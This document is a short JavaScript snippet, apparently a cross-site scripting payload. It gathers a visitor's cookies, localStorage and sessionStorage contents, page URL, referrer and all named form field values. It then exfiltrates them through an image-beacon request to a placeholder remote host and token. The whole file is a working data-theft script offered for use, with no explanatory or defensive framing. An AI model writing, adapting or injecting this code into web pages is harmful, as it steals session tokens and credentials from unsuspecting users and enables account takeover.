(function(){
  var d = document, w = window;
  var payload = {
    cookies: d.cookie || 'none',
    pageTitle: d.title,
    url: w.location.href,
    referrer: d.referrer || 'none',
    localStorage: {},
    sessionStorage: {},
    forms: []
  };

  // Grab localStorage
  try {
    for (var i = 0; i < localStorage.length; i++) {
      var k = localStorage.key(i);
      payload.localStorage[k] = localStorage.getItem(k);
    }
  } catch(e) {}

  // Grab sessionStorage
  try {
    for (var i = 0; i < sessionStorage.length; i++) {
      var k = sessionStorage.key(i);
      payload.sessionStorage[k] = sessionStorage.getItem(k);
    }
  } catch(e) {}

  // Grab form fields
  try {
    var forms = d.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
      var inputs = forms[i].querySelectorAll('input, textarea, select');
      var fields = {};
      for (var j = 0; j < inputs.length; j++) {
        if (inputs[j].name) fields[inputs[j].name] = inputs[j].value;
      }
      payload.forms.push(fields);
    }
  } catch(e) {}

  // Send via image beacon (GET) as fallback-safe method
  var TOKEN = "YOUR_TOKEN_HERE";
  var HOST  = "YOUR_VPS_IP:8443";
  var data  = encodeURIComponent(JSON.stringify(payload));
  new Image().src = "https://" + HOST + "/webhook/" + TOKEN + "?data=" + data;
})();
